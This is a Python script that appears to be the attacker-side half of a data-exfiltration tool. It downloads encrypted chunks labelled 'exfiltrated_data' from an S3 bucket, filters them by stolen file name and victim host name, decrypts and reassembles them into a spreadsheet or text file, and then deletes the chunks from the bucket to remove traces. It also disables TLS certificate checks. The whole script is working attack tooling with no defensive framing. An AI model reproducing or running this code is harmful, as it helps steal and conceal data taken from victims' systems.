import boto3
import sys
import json
import os
import math
from cryptography.fernet import Fernet
import urllib3



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#----------Enviroment Reset (Delete old files, etc)--------------
if os.path.exists("reconstructedFile.txt"):
	os.remove("reconstructedFile.txt")

if not os.path.exists("downloadedFiles/"):
	os.makedirs("downloadedFiles/")

folder = 'downloadedFiles'
for file in os.listdir(folder):
	file_path = os.path.join(folder, file)
	if os.path.isfile(file_path):
		os.unlink(file_path)

#----------AWS Connection--------------
session = boto3.session.Session(aws_access_key_id = aws_access_key_id,
 								aws_secret_access_key = aws_secret_access_key,
 								region_name = region)
aws_s3_client = session.client('s3', verify = False)
aws_s3_resource = session.resource('s3', verify = False)

#----------Here we get the all the fileNames in our bucket--------------
list_response = aws_s3_client.list_objects(
	Bucket = exfiltration_bucket_name,
	Delimiter = '/exfiltrated_data'
)
try:
	list_response_contents = list_response['Contents']
except KeyError:
	print("The fileName + hostName combination was not found")
	print("Remember bucket contents are deleted once decrypted!")
	quit()
fileNames = []
for content in list_response_contents:
	name = content['Key'].replace('.txt','')
	#-----------We only get files which match our argv arguments----------
	if sys.argv[1] in name and sys.argv[2] in name:
		fileNames.append(name)

#----------We remove .txt for sorting, just in case--------------
fileNames.sort(key = lambda x: int(x.split('.')[-1]))
for i in range(len(fileNames)):
	fileNames[i] = fileNames[i] + '.txt'

print('--------------------------------------------------------------------------------')
print('Started decryption process...')
#----------S3 Download only transfers, so files must be created beforehand----------
for file in fileNames:
	name = file.replace('exfiltrated_data/','')
	print("Creating file "+ name + " for transfer")
	file = open('downloadedFiles/'+name , "w+")
	file.close()

#----------We download files from bucket to the previously created files--------------
for file in fileNames:
	print("Downloading " + file)
	name = file.replace('exfiltrated_data/','')
	aws_s3_resource.meta.client.download_file(exfiltration_bucket_name, file, 'downloadedFiles/'+name)

#----------We check the correct extension-------------
if "xlsx" in fileNames[0]:
	reconstructed_file_name = 'reconstructedFile.xlsx'
elif "csv" in fileNames[0]:
	reconstructed_file_name = 'reconstructedFile.csv'
else:
	reconstructed_file_name = 'reconstructedFile.txt'

#----------We create a reconstruction file--------------
with open(reconstructed_file_name, 'wb') as finalFile:
	#---------- fileNames are partitionNames--------
	for file in fileNames:

		#----------We open the n partition--------------
		name = file.replace('exfiltrated_data/','')
		print("Decrypting " + name)
		file = open('downloadedFiles/'+name , "r")
		data = file.read()
		data_bytes = data.encode()

		#----------Info decode--------------
		f = Fernet(key)
		data_decrypt = f.decrypt(data_bytes)

		#----------Info goes inside reconstructedFile--------------
		finalFile.write(data_decrypt)

		file.close()

#----------We delete all information from the bucket--------------
bucket = aws_s3_resource.Bucket(exfiltration_bucket_name)
for file in fileNames:
	aws_s3_resource.Object(exfiltration_bucket_name, file).delete()

print('Finished decryption! Check out reconstructed file')
print('--------------------------------------------------------------------------------')
